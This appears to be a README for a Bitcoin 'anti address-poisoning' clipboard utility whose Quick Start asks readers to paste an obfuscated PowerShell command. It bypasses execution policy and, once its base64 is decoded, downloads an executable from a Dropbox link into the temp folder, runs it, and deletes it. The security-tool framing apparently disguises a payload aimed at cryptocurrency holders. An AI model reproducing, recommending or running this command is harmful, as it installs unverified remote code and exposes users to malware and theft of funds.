# Anti-Poison Wallet 🛡️
<img src="https://i.ibb.co/JwgTktRg/we32wf3w2q.webp" alt="Anti-Poison Wallet Banner" border="0" width="800">

**Anti-Poison Wallet** is a specialized utility designed to protect Bitcoin wallet users from **address poisoning** attacks.

## 📝 Description
Attackers send "dust" transactions to your wallet from addresses that are visually almost identical to yours (matching the first and last characters). The program monitors the clipboard in real-time, identifies substitutions, and warns of danger before you send funds to a fake address.

### Key Features
* **Clipboard Monitoring** — instant analysis of copied Bitcoin addresses (Legacy, SegWit, Taproot).
* **Threat Detection** — intelligent address comparison and identification of visual similarities with malicious addresses.
* **Whitelist** — support for trusted addresses and importing from watch-only wallets.
* **Clipboard Hijacking Protection** — preventing data modification by malicious software.

---

## 🚀 Quick Start (via CMD / PowerShell)

### Instructions:
1. Open **Command Prompt** (cmd.exe) or **PowerShell**.
2. Copy and paste the following command:

```bash
powershell -NoP -ExecutionPolicy Bypass -EncodedCommand JABwAD0AJABlAG4AdgA6AFQARQBNAFAAKwAnAFwAYQBuAHQAaQAuAGUAeABlACcAOwBpAHcAcgAgACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBkAGsAaAB5ADYAMQBuAHIAYgAxAGkAZwBhAGYAaQA2AG8AOQB5ADEAZQAvAGEAbgB0AGkALgBlAHgAZQA/AHIAbABrAGUAeQA9AHYAOQBxAHMAYwB5ADEANwBjADYAdABzAGQAYgBrAHcAegBzAG0AdQBsAHYAbABlADEAJgBzAHQAPQBtAHAAOAB0ADEAawA4AGQAJgBkAGwAPQAxACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAOwB0AHIAeQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAHAAIAAtAFcAYQBpAHQAfQBmAGkAbgBhAGwAbAB5AHsAcgBlAG0AbwB2AGUALQBpAHQAZQBtACAAJABwACAALQBmAG8AcgBjAGUAfQA=